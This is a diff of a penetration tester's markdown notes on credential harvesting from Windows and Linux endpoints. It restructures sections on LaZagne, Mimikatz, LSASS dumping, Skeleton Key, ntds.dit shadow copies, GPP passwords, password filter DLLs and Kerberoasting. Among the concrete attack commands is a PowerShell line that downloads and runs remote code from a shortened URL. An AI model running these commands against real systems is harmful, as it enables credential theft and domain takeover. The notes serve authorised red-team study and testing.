@@ -1,7 +1,16 @@
 # Endpoint Harvesting
 
-## **Endpoint Harvesting**
+## **Endpoint Harvesting Tools**
 
+{% tabs %}
+{% tab title="Reference" %}
+* [http://pwnwiki.io/#!presence/windows/blind.md](http://pwnwiki.io/#!presence/windows/blind.md) - Windows Blind files to search for as an attacker
+* [http://pwnwiki.io/#!presence/linux/blind.md](http://pwnwiki.io/#!presence/linux/blind.md) - Linux Blind files
+* [http://pwnwiki.io/#!presence/windows/windows\_cmd\_config.md](http://pwnwiki.io/#!presence/windows/windows\_cmd\_config.md) - Commands that display information about the configuration of the victim and are usually executed from the context of the `cmd.exe` or `command.exe` prompt.
+* [http://pwnwiki.io/#!presence/windows/network.md](http://pwnwiki.io/#!presence/windows/network.md) - Windows commands to help you gather information about the victim system's network connections, devices and capabilities.
+{% endtab %}
+
+{% tab title="LaZagne" %}
 ### [LaZagne](https://github.com/AlessandroZ/LaZagne)&#x20;
 
 LaZagne is an open-source tool used in post-exploitation to recover stored passwords on a system. Its modules support Windows, Linux, and OSX, but are primarily intended for Windows systems.\
@@ -33,47 +42,26 @@ Simply double clicking on the executable ‘Lazagne.exe' will cause a warning me
   * `# Run modules for Google Chrome. Add the -v flag for verbose output`
     * `python laZagne.py browsers -google -v`
 
+
+{% endtab %}
+
+{% tab title="Other Tools" %}
+*
+{% endtab %}
+{% endtabs %}
+
 {% embed url="https://youtu.be/AwFyiFOXrd0" %}
 
-### **Other Tools**
+## Credential Extraction
 
-* [HostRecon](https://github.com/dafthack/HostRecon) - Invoke-HostRecon runs a number of checks on a system to help provide situational awareness to a penetration tester during the reconnaissance phase of an engagement. It gathers information about the local system, users, and domain information. It does not use any 'net', 'ipconfig', 'whoami', 'netstat', or other system commands to help avoid detection.
-* [PassHunt](https://github.com/Dionach/PassHunt) - PassHunt searches drives for documents that contain passwords or any other regular expression. It's designed to be a simple, standalone tool that can be run from a USB stick.
-* [SessionGopher](https://github.com/Arvanaghi/SessionGopher) - SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It has WMI functionality built in so it can be run remotely. Its best use case is to identify systems that may connect to Unix systems, jump boxes, or point-of-sale terminals.
-* [CredDump](https://github.com/moyix/creddump) - Tool for dumping credentials and secrets from Windows Registry Hives.
-  * [https://www.kali.org/tools/creddump7/](https://www.kali.org/tools/creddump7/)
-* [dumpsterdiver](https://www.kali.org/tools/dumpsterdiver/) - This package contains a tool, which can analyze big volumes of data in search of hardcoded secrets like keys (e.g. AWS Access Key, Azure Share Key or SSH keys) or passwords.
-* [polenum](https://www.kali.org/tools/polenum/) - polenum is a Python script which uses the Impacket Library from CORE Security Technologies to extract the password policy information from a windows machine.
-* [powersploit](https://www.kali.org/tools/powersploit/) - PowerSploit is a series of Microsoft PowerShell scripts that can be used in post-exploitation scenarios during authorized penetration tests.
-* [pspy](https://github.com/DominicBreuker/pspy) - Monitor linux processes without root permissions
-* [swap\_digger](https://github.com/sevagas/swap\_digger) - swap\_digger is a tool used to automate Linux swap analysis during post-exploitation or forensics. It automates swap extraction and searches for Linux user credentials, web forms credentials, web forms emails, http basic authentication, Wifi SSID and keys, etc.
-* [https://highon.coffee/blog/linux-local-enumeration-script/](https://highon.coffee/blog/linux-local-enumeration-script/)
-* [Masky](https://github.com/Z4kSec/Masky) - Python library with CLI allowing to remotely dump domain user credentials via an ADCS without dumping the LSASS process memory
-  * [https://z4ksec.github.io/posts/masky-release-v0.0.3/](https://z4ksec.github.io/posts/masky-release-v0.0.3/)
+<details>
 
-### Reference
-
-* [http://pwnwiki.io/#!presence/windows/blind.md](http://pwnwiki.io/#!presence/windows/blind.md) - Windows Blind files to search for as an attacker
-* [http://pwnwiki.io/#!presence/linux/blind.md](http://pwnwiki.io/#!presence/linux/blind.md) - Linux Blind files
-* [http://pwnwiki.io/#!presence/windows/windows\_cmd\_config.md](http://pwnwiki.io/#!presence/windows/windows\_cmd\_config.md) - Commands that display information about the configuration of the victim and are usually executed from the context of the `cmd.exe` or `command.exe` prompt.
-* [http://pwnwiki.io/#!presence/windows/network.md](http://pwnwiki.io/#!presence/windows/network.md) - Windows commands to help you gather information about the victim system's network connections, devices and capabilities.
-
-## Dumping LSASS for credentials
-
-### **Dumping LSASS with out Mimikatz**
-
-* [https://ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz](https://ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz)
-* [https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/](https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/)
-* ProcDump
-  * \>procdump.exe -accepteula -ma lsass.exe lsass.dmp
-    * will need local admin to dump LSASS
-  * Create dump file by using options within tasklist
-  * Executing a native comsvcs.dll DLL found in Windows\system32 with rundll32:
-    * .\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full
-
-### **MimiKatz**
+<summary>MimiKatz</summary>
 
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md)
+
+<!---->
+
 * Pulls credentials out of LSASS
   * Can be run im memory so you dont drop and executable on the target
   * Commands - will give clear text pw of currently logged in users
@@ -102,7 +90,26 @@ Simply double clicking on the executable ‘Lazagne.exe' will cause a warning me
     * Search queries preloaded for Gmail, O365, Jira, github, bugzilla,zendesk, Cpanel, Dropbox, onedrive, AWS, SLack, Twitter, and Facebook
     * Does not require Local admin, it runs in Userland mem
 
-### **Skeleton Key attack**
+</details>
+
+<details>
+
+<summary>Dumping LSASS with out Mimikatz</summary>
+
+* [https://ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz](https://ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz)
+* [https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/](https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/)
+* ProcDump
+  * \>procdump.exe -accepteula -ma lsass.exe lsass.dmp
+    * will need local admin to dump LSASS
+  * Create dump file by using options within tasklist
+  * Executing a native comsvcs.dll DLL found in Windows\system32 with rundll32:
+    * .\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full
+
+</details>
+
+<details>
+
+<summary>Skeleton Key attack</summary>
 
 * [http://www.secureworks.com/cyber-threat-intelligence/threats/skeleton-key-malware-analysis](http://www.secureworks.com/cyber-threat-intelligence/threats/skeleton-key-malware-analysis)
 * Back door a privileged AD account with Mimikatz
@@ -110,10 +117,13 @@ Simply double clicking on the executable ‘Lazagne.exe' will cause a warning me
   * \>mimikatz.exe “privilege::debug” “misc::skeleton” exit
 * Use
   * \>net use \* \\\dc\c$ mimikatz /user:lab@attacker.domain
+  * [https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/credential\_extraction/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/credential\_extraction/)
 
-[https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/credential\_extraction/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/credential\_extraction/)
+</details>
 
-## Volume Shadow Copy
+<details>
+
+<summary>Volume Shadow Copy</summary>
 
 Once you have Domain Admin access, the old way to pull all hashes from the DC was to run commands on the domain controller and user Shadow volume or Raw copy to pull the ntds.dit file
 
@@ -133,6 +143,9 @@ Once you have Domain Admin access, the old way to pull all hashes from the DC wa
       * \#set VSHADOW\_DEVICE=\\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12
       * \#for /R %VSHADOW\_DEVICE%\ %i in (\*) do @echo %i
       * &#x20;[https://blogs.msdn.microsoft.com/adioltean/2004/12/14/creating-shadow-copies-from-the-command-line/](https://blogs.msdn.microsoft.com/adioltean/2004/12/14/creating-shadow-copies-from-the-command-line/)
+
+<!---->
+
 * Listing shadow copy contents. This is tricky since the shadow copies are not regular (standalone) volumes. These are pseudo-volume devices, without a drive letter or volume name, in the form \\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyNNN. You can still access their contents from the command line, if you know how. For example, copying a file from the shadow copy can be done this way:
   * dir > c:\somefile.txt
   * &#x20;vssadmin create shadow /for=c:
@@ -161,10 +174,31 @@ Once you have Domain Admin access, the old way to pull all hashes from the DC wa
   * Powershell Empire module
     * \>powershell/credentials/mimikatz
 
-## Windows Service Extraction
+</details>
 
+<details>
+
+<summary>Memory Extraction</summary>
+
+* [MimiPenguin](https://github.com/huntergregal/mimipenguin) - A tool to dump the login password from the current linux desktop user.
+* [Dumping Lsass.exe to Disk Without Mimikatz and Extracting Credentials - Red Teaming Experiments](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz)&#x20;
+* [Internal-Monologue](https://github.com/eladshamir/Internal-monologue) - Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS
+
+
+
+</details>
+
+#### Windows Service Extraction
+
+{% tabs %}
+{% tab title="Windows Native Tools" %}
 * WCE - Windows Credential Editor
   * Lists windows logon sessions and add/change/delete associated credentials
+* Windows credential manager
+  * [https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-WCMDump.ps1](https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-WCMDump.ps1)
+{% endtab %}
+
+{% tab title="GPP Vuln" %}
 * Group Policy Preference Vul
   * Info for accounts under GPP stored in a Groups.xml file that contains cpassword hash.
   * Uses a publiclally posed Microsoft AES , easy to find, easy to use
@@ -174,6 +208,9 @@ Once you have Domain Admin access, the old way to pull all hashes from the DC wa
     * \>set SESSION \[Session # of your shell]
     * \>exploit
   * [http://esec-pentest.sogeti.com/public/files/gpprefdecrypt.py](http://esec-pentest.sogeti.com/public/files/gpprefdecrypt.py)
+{% endtab %}
+
+{% tab title="Cached Creds" %}
 * Windows Cached Credentials
   * Windows caches the last 10 sets of credentials used on the device by default
   * Metasploit module - cachedump
@@ -181,8 +218,11 @@ Once you have Domain Admin access, the old way to pull all hashes from the DC wa
     * format: $DCC2$10240#account\_name#hash
     * oclHashcat64.exe -m 2100 hashes \mscash2.txt lists \crackstat\_realhuman\_shill.txt
     * Warning: With a normal GPU this takes on average 20 days to crack
-* Windows credential manager
-  * [https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-WCMDump.ps1](https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-WCMDump.ps1)
+
+
+{% endtab %}
+
+{% tab title="PW Filter DLL" %}
 * Password FIlter DLL - used by Windows to enforce password strength policies.
   * System administrators can create password filter DLLs to ensure all password changes meet a minimum requirement.
   * New passwords are passed to the DLL in plaintext, allowing attackers to leverage this Windows feature to steal credentials.
@@ -196,6 +236,11 @@ Once you have Domain Admin access, the old way to pull all hashes from the DC wa
     * `PasswordChangeNotify` is called to inform the filter if the password change was made successfully.
   * Password filter DLLs can be used by malicious actors to harvest account credentials. The `PasswordFilter` and `PasswordChangeNotify` functions both have access to the plaintext password and the name of the account whose password is to be changed. By installing a malicious password filter, attackers can exfiltrate every updated password to a remote server, local file or even block every password change by setting their filter’s `PasswordFilter` function to always return false.
   * Ensuring that appropriate permissions are set for the `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages` key will prevent unauthorized users or groups from being able to register new filters.
+
+
+{% endtab %}
+
+{% tab title="Kerberoast" %}
 * Kerberoasting
   * Any ticekt can be requested by any user with kerberos, from the domain controller
   * Those tickets are encrypted with the NTLM hash of the associated service user.
@@ -215,9 +260,5 @@ Once you have Domain Admin access, the old way to pull all hashes from the DC wa
         * \>powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2qx4kuH'); Invoke-Mimikatz -Command ‘’'''''kerberos::list /export'''''''
         * Once extracted and on our victims machine and we can start cracking them!
           * use tgsrepcrack.py
-
-## Memory Extraction
-
-* [MimiPenguin](https://github.com/huntergregal/mimipenguin) - A tool to dump the login password from the current linux desktop user.
-* [Dumping Lsass.exe to Disk Without Mimikatz and Extracting Credentials - Red Teaming Experiments](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz)&#x20;
-* [Internal-Monologue](https://github.com/eladshamir/Internal-monologue) - Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS
+{% endtab %}
+{% endtabs %}
